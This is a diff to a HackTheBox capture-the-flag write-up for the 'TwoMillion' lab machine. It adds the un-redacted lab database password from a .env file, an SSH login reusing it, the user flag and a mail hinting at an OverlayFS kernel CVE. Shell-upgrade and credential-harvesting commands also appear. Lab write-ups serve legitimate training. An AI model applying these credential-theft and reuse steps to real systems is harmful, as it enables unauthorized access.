@@ -1,3 +1,4 @@
+# Init
 Because this is still one of my initial boxes, I am going to do this in guided mode (It's available for retired machines).
 Starting with `nmap`:
 ```
@@ -159,6 +160,8 @@ www-data@2million:~/html$ whoami
 www-data
 ```
 
+# User Flag
+
 Let's quickly prettify it!
 ```
 www-data@2million:~/html$ python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -190,5 +193,45 @@ www-data@2million:~/html$ cat .env
 DB_HOST=127.0.0.1
 DB_DATABASE=htb_prod
 DB_USERNAME=admin
-DB_PASSWORD=<REDACTED>
+DB_PASSWORD=SuperDuperPass123
+```
+
+Well, as we have `ssh` port open, let's try to login via SSH!
+```
+┌─[htb_lab_truelyyours]─[10.10.16.82]─[truelyyours@parrot]─[~/htb/twomillion]
+└──╼ [★]$ ssh admin@2million.htb
+The authenticity of host '2million.htb (10.10.11.221)' can't be established.
+ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '2million.htb' (ED25519) to the list of known hosts.
+admin@2million.htb's password: 
+Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.70-051570-generic x86_64)
+.
+.
+.
+admin@2million:~$ whoami
+admin
+admin@2million:~$ ls
+user.txt
+```
+
+Well, we can login as admin and we have the user flag! 🎉🎉
+# Root Flag
+When we login into via `ssh`, we do get a notification that we have a mail. So, let's check that:
+```
+admin@2million:~$ cat /var/mail/admin 
+From: ch4p <ch4p@2million.htb>
+To: admin <admin@2million.htb>
+Cc: g0blin <g0blin@2million.htb>
+Subject: Urgent: Patch System OS
+Date: Tue, 1 June 2023 10:45:22 -0700
+Message-ID: <9876543210@2million.htb>
+X-Mailer: ThunderMail Pro 5.2
+
+Hey admin,
+
+I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.
+
+HTB Godfather
 ```
